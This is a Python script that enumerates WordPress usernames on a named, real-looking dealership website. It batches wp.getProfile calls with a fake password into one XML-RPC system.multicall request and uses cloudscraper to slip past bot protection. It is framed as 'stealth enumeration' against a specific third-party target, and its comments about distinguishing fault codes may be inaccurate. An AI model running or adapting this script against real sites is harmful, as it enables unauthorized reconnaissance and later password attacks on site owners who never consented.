import cloudscraper
import json

# Configuration
TARGET_XMLRPC = "https://montcalmautosales.com/xmlrpc.php"
# Common WordPress usernames to check
usernames_to_test = ["admin", "usamdt_admin", "webmaster", "editor", "phil", "singleton"]

def build_multicall_payload(users):
    """Wraps multiple getUser calls into a single system.multicall request."""
    calls = []
    for user in users:
        # We use wp.getUsers or wp.getProfile to see if the server validates the user
        # Even with a fake password, a valid user often triggers a different fault code.
        calls.append({
            'methodName': 'wp.getProfile',
            'params': [0, user, 'fake_password_123!']
        })
    
    # Constructing the XML manually for precision
    xml_body = "<?xml version='1.0'?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
    for call in calls:
        xml_body += f"<value><struct><member><name>methodName</name><value><string>{call['methodName']}</string></value></member>"
        xml_body += f"<member><name>params</name><value><array><data>"
        for p in call['params']:
            xml_body += f"<value><string>{p}</string></value>"
        xml_body += "</data></array></value></member></struct></value>"
    xml_body += "</data></array></value></param></params></methodCall>"
    return xml_body

def execute_enumeration():
    scraper = cloudscraper.create_scraper()
    payload = build_multicall_payload(usernames_to_test)
    
    print(f"[*] Executing stealth enumeration via system.multicall on {len(usernames_to_test)} users...")
    
    try:
        headers = {'Content-Type': 'text/xml'}
        response = scraper.post(TARGET_XMLRPC, data=payload, headers=headers)
        
        # Analyze results
        # Valid users typically return 'Incorrect password' (Fault code 403)
        # Invalid users typically return 'Invalid username' (Fault code 405)
        if "Incorrect password" in response.text:
            print("[+] Potential matches found! Analyze the raw XML response for faultCode variations.")
            print(response.text[:500] + "...") # Preview the response
        else:
            print("[-] No clear username matches identified in this batch.")
            
    except Exception as e:
        print(f"[X] Enumeration failed: {e}")

if __name__ == "__main__":
    execute_enumeration()
